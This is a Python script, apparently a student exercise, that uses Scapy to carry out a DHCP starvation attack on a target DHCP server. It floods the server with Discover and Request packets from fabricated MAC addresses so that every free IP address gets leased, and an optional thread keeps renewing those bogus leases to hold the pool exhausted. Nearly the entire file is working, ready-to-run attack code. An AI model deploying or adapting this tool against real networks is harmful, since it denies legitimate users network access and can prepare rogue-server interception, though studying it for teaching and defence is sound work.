#!python

import argparse
import re

from scapy.all import *
from scapy.layers.dhcp import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether


def remove_prefix(text, prefix):
    """
    Func to deal with the "0x" at the beginning of each hexa
    :param text:
    :param prefix:
    :return:
    """
    return re.sub(r'^{0}'.format(re.escape(prefix)), '', text)

def generateFakeMac():
    """
    Generates a fabricated mac addr. We will try to make the server bind this mac to a free ip
    :return:
    """
    res = str(remove_prefix(hex(random.randrange(1, 255, 1)),"0x"))+':'
    for i in range(5):
        res = res +str(remove_prefix(hex(random.randrange(1, 255, 1)),"0x"))
        if(i != 4):
            res = res+':'
    return res

def send_the_discover(tarip, interface,per):
    """
    This is called from  the while loop in "main()".
    It sends a fabricated DHCP req to the server in order to offcourse lease one of the free ip's
    :param tarip:
    :param interface:
    :param per:
    :return:
    """
    fake_mac = generateFakeMac()  # Fabricated mac we use as the src in the Discover. Meant to be bound to a free ip
    myxid = random.randrange(5234, None, 3)  # The id for each first DHCP handshake
    dhcp_discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst=tarip)/UDP(sport=68,dport=67)\
                    /BOOTP(chaddr=[mac2str(fake_mac)], xid=myxid)/DHCP(options=[("message-type", "discover"), "end"])  #Discover packet
    print(fake_mac)  # Print the fabricated, to be bound, mac addr
    sendp(dhcp_discover)  # Send Discover to lease an ip for the mac printed above
    print("DISCOVER SENT")  # Updating we sent a Discover massage
    get_the_offer(fake_mac, myxid, tarip, interface,per)  # Proceed to next step of DHCP handshake

def handle_dhcp_packet(fake_mac,myxid,tarip,interface,per):
    """
    This func is called by the sniffer through the stop_filter option
    Used to give the nested func below it access to some args in addition to the sniffed packet
    :param fake_mac:
    :param myxid:
    :param tarip:
    :param interface:
    :param per:
    :return:
    """
    def handle_the_packet(packet):
        """
        The nested func that gets the sniffed packet as an arg, and has access to the args delivered to the nesting func
        :param packet:
        :return:
        """
        if "DHCP" in packet:  # Ensures the sniffed packet is a DHCP
            if packet[BOOTP].xid == myxid and packet[DHCP].options[0][1]==2:  # Checks if it's the DHCP Offer packet
                print("GOT THE OFFER")  # Informs we successfully got the responded Offer to the req we sent earlier
                craft_dhcp_request(packet, myxid, fake_mac, tarip, interface,per)  # Proceed to next step of handshake
                return True  # The wanted Offer was found. True to stop sniffing
        else:
            return False
    return handle_the_packet

def get_the_offer(fake_mac,myxid,tarip,interface,per):
    """
    This func is called after we sent a Discover. It deals with the second step of the handshake- the Offer
    Using sniffing we try to detect the Offer packet from the server
    :param fake_mac:
    :param myxid:
    :param tarip:
    :param interface:
    :param per:
    :return:
    """
    p=sniff(filter="udp and (port 67 or 68)", iface=interface, stop_filter=handle_dhcp_packet(fake_mac,myxid,tarip,interface,per), timeout=4)  # We sniff dhcp packets and examine each one to
                                                                                                                                               # try and catch the server's Offer to us
                                                                                                                                               # We will do it using stop_filter option. Sniffing stops when the wanted packet is found.
                                                                                                                                               # A timeout is set to abort sniffing in case the packet isnt found after some time

def activate_persistence(fake_mac, tarip, interface, the_lease_time, my_ip, server_mac, server_id):
    """
    This func is being run through a thread.
    This func keeps the fabricated mac bound to the leased ip
    :param fake_mac:
    :param tarip:
    :param interface:
    :param the_lease_time:
    :param my_ip:
    :param server_mac:
    :param server_id:
    :return:
    """
    while(True):  # Loop keeps the persistence active
        some_xid=random.randrange(5234, None, 3)  # Generate a new id for the "session" with the server
        time_to_wait=the_lease_time/2  # Time to wait until sending a req to renew the binding
        dhcp_req_renewal = Ether(src=fake_mac, dst=server_mac) / IP(src=my_ip, dst=tarip) / UDP(sport=68, dport=67) / BOOTP(chaddr=[mac2str(fake_mac)], xid=some_xid)\
                       / DHCP(options=[("message-type", "request"), ("server_id", server_id), ("requested_addr", my_ip), ("param_req_list", 0), "end"])  # The req to be sent as a "renewal request"
        time.sleep(time_to_wait)  # Wait until the time to ask for "renewal" comes
        sendp(dhcp_req_renewal,iface=interface)  # Send the req after the waiting is over
        print("\nRENEWED: "+fake_mac+" to "+my_ip+"\n")  # Informing we successfully sent a renewal req
        time.sleep(1)  # Used to solve sync problems

def craft_dhcp_request(packet, myxid, fake_mac, tarip, interface,per):
    """
    This func deals with the 3rd step of the handshake- sending the request (as a respones to an earlier Offer we got earlier)
    :param packet: We passed as an arg the earlier catched DHCP Offer packet
    :param myxid:
    :param fake_mac:
    :param tarip:
    :param interface:
    :param per:
    :return:
    """
    dhcp_req = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst=tarip)/\
               UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(fake_mac)], xid=myxid)\
               /DHCP(options=[("message-type", "request"), ("server_id", (packet[DHCP].options[1][1])),
                              ("requested_addr", packet[BOOTP].yiaddr), ("param_req_list", 0), "end"])  # This is the DHCP req we are going to send
    sendp(dhcp_req,iface=interface)  # We send the DHCP req
    print("SENT REQUEST. DONE!  "+str(packet[BOOTP].yiaddr)+"\n") # Informs that the req was successfully sent
    # Now we prepare variables to use if the user wants PERSISTENCE
    the_lease_time=packet[DHCP].options[2][1]  # Extracting the lease time from the packet (DHCP Offer given as an arg)
    my_ip = packet[BOOTP].yiaddr  # The ip we leased from the server (Bound to "fake_mac")
    server_mac = packet[Ether].src  # The extracted server mac (Extracted from the Offer)
    server_id = packet[DHCP].options[1][1]  # The extracted server mac (Extracted from the Offer)
    if per:  # Do the next steps if the user chose persistence
        per_thread=Thread(target=activate_persistence,args=[fake_mac, tarip, interface, the_lease_time, my_ip, server_mac, server_id])  # We open and start a thread dealing with keeping bond between our fabricated mac addr (fake_mac) and the ip given from the server
        per_thread.start()  # The persistence is kept active through the thread. Code keeps running at the same time.


# A disclaimer: this was the 1st exercise so we went on the safe side with the documentation and made it extra detailed.
def main():
    per = False
    interface = "eth0"
    tarip="255.255.255.255"  # "192.168.56.2" was used for the real time attack experiment
    op = argparse.ArgumentParser(description="DHCP Starvation")
    op.add_argument("-p", "--persistant", type=bool, help = "persistant?")
    op.add_argument("-i", "--iface", type=str, help = "Interface you wish to use")
    op.add_argument("-t", "--target", type=str, help = "IP of target server")
    args = op.parse_args()
    if args.persistant != None:
        per = bool(args.persistant)
        # print(args.persistant)
    if args.iface != None:
        interface = str(args.iface)
        # print(args.iface)
    if args.target != None:
        tarip = str(args.target)
        # print(target)

    counter=1  # Counter to print how many Discover packets we sent so far
    while(1==1):  # Loop for starving the server
        print("\nDISCOVER NUMBER "+str(counter)+':')
        send_the_discover(tarip,interface,per)  # Through this, each iteration we try to lease another free ip
        counter=counter+1

if __name__ == '__main__':
    main()

